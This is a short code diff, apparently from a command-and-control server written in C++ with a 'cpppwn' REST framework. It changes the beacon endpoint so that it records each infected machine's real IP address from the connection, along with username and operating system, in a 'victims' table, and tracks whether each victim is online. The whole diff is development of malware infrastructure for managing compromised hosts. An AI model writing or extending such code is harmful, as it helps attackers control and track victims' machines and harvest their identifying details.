@@ -38,7 +38,9 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
             // 1. Determine External IP from the socket if "auto" was sent
             std::string effective_ip = beacon.external_ip;
             if (effective_ip == "auto" || effective_ip == "1.1.1.1") {
-                //effective_ip = req.ip_address; // Grab IP from connection
+                if (!req.ip_address.empty()) {
+                    effective_ip = req.ip_address;
+                }
             }
 
             // 2. Register/Update Victim (Upsert Pattern)
@@ -53,7 +55,7 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
             v_data.username = beacon.username;
             v_data.operating_system = beacon.operating_system;
             v_data.last_update = get_unix_time();
-            v_data.status = 1; // Online
+            refresh_victim_status(v_data);
 
             if (existing.has_value()) {
                 victims.update(existing->id, v_data);
